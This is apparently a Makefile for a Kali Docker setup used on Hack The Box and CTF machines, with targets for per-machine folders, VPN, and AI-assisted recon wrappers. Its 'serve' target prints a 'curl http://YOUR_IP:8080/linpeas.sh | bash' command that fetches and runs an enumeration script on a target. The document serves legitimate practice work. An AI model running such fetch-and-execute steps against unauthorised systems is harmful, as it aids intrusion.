# ─────────────────────────────────────────────────────────────
#  HTB / CTF Docker Environment — Makefile
#  Usage: make <target>
# ─────────────────────────────────────────────────────────────

IMAGE    := kali-htb
# Host folder mounted to /ctfdata inside the container
WORKDIR  := $(PWD)/ctfdata
CONTAINER:= htb-box

.DEFAULT_GOAL := help

# ─── Build ────────────────────────────────────────────────────

.PHONY: build
build:  ## Build image (first time ~10-20 min)
	docker build -t $(IMAGE) .

.PHONY: rebuild
rebuild:  ## Rebuild image without cache
	docker build --no-cache -t $(IMAGE) .

# ─── Run ──────────────────────────────────────────────────────

.PHONY: up
up: dirs  ## Start a new container (host network)
	docker run -it \
		--name $(CONTAINER) \
		--network host \
		--cap-add=NET_ADMIN \
		--device=/dev/net/tun \
		-v $(WORKDIR):/ctfdata \
		$(IMAGE)

.PHONY: resume
resume:  ## Enter an existing container
	@docker start $(CONTAINER) 2>/dev/null || true
	docker exec -it $(CONTAINER) /bin/bash

.PHONY: attach
attach: resume  ## Alias for resume

# ─── Machine management ───────────────────────────────────────

.PHONY: new-machine
new-machine:  ## Create directory for a new machine: make new-machine NAME=Forest
	@[ -n "$(NAME)" ] || (echo "Usage: make new-machine NAME=<machine>" && exit 1)
	mkdir -p $(WORKDIR)/$(NAME)/scans $(WORKDIR)/$(NAME)/loot $(WORKDIR)/$(NAME)/exploit $(WORKDIR)/$(NAME)/notes
	@echo "Created: $(WORKDIR)/$(NAME)/{scans,loot,exploit,notes}"
	@echo "# $(NAME)" > $(WORKDIR)/$(NAME)/notes/notes.md
	@echo "## IP\n\n## Recon\n\n## Foothold\n\n## PrivEsc\n\n## Flags\n" \
	    >> $(WORKDIR)/$(NAME)/notes/notes.md

.PHONY: set-target
set-target:  ## Save target IP: make set-target IP=10.10.11.x
	@[ -n "$(IP)" ] || (echo "Usage: make set-target IP=<ip>" && exit 1)
	@echo "export TARGET=$(IP)" > $(WORKDIR)/.target
	@echo "TARGET set to $(IP)"

# ─── Lifecycle ────────────────────────────────────────────────

.PHONY: stop
stop:  ## Stop the container (data preserved)
	docker stop $(CONTAINER)

.PHONY: rm
rm: stop  ## Remove container (image and /ctfdata folder remain)
	docker rm $(CONTAINER)

.PHONY: clean
clean: rm  ## Remove container and image
	docker rmi $(IMAGE)

# ─── Utilities ────────────────────────────────────────────────

.PHONY: shell
shell:  ## Open an additional shell in the running container
	docker exec -it $(CONTAINER) /bin/bash

.PHONY: dirs
dirs:  ## Create base structure ~/ctfdata
	mkdir -p $(WORKDIR)/scans $(WORKDIR)/loot $(WORKDIR)/exploit $(WORKDIR)/notes $(WORKDIR)/vpn
	@echo "HTB workdir ready: $(WORKDIR)"

.PHONY: vpn
vpn:  ## Connect VPN from inside the container: make vpn FILE=htb.ovpn
	@[ -n "$(FILE)" ] || (echo "Usage: make vpn FILE=<file.ovpn>" && exit 1)
	docker exec -it $(CONTAINER) openvpn /ctfdata/vpn/$(FILE)

.PHONY: logs
logs:  ## Show container logs
	docker logs $(CONTAINER)

.PHONY: ps
ps:  ## Container status
	docker ps -a --filter name=$(CONTAINER)

.PHONY: update
update:  ## Update packages inside the container
	docker exec -it $(CONTAINER) bash -c "apt-get update && apt-get upgrade -y"

# ─── Claude integration ───────────────────────────────────────

.PHONY: install-scripts
install-scripts:  ## Install Claude wrapper scripts to /usr/local/bin
	chmod +x scripts/*
	sudo cp scripts/nmap-claude scripts/gobuster-claude \
	         scripts/linpeas-claude scripts/hash-claude \
	         scripts/ai-recon /usr/local/bin/
	@echo "Installed: nmap-claude, gobuster-claude, linpeas-claude, hash-claude, ai-recon"

.PHONY: ai-recon
ai-recon:  ## Full recon with Claude analysis: make ai-recon IP=10.10.11.x [NAME=Forest]
	@[ -n "$(IP)" ] || (echo "Usage: make ai-recon IP=<ip> [NAME=<machine>]" && exit 1)
	@bash scripts/ai-recon $(IP) $(NAME)

.PHONY: serve
serve:  ## HTTP server to serve files to the target (port 8080)
	@echo "Serving $(WORKDIR) on :8080 — linpeas/winpeas available on the target"
	@echo "On target: curl http://YOUR_IP:8080/linpeas.sh | bash"
	cd $(WORKDIR) && python3 -m http.server 8080

# ─── Help ─────────────────────────────────────────────────────

.PHONY: help
help:  ## Show this help
	@echo ""
	@echo "  HTB/CTF Docker Environment"
	@echo ""
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) \
	    | awk 'BEGIN {FS = ":.*?## "}; {printf "  \033[36mmake %-16s\033[0m %s\n", $$1, $$2}'
	@echo ""
	@echo "  Workdir: $(WORKDIR)"
	@echo "  Image:   $(IMAGE)"
	@echo "  Container: $(CONTAINER)"
	@echo ""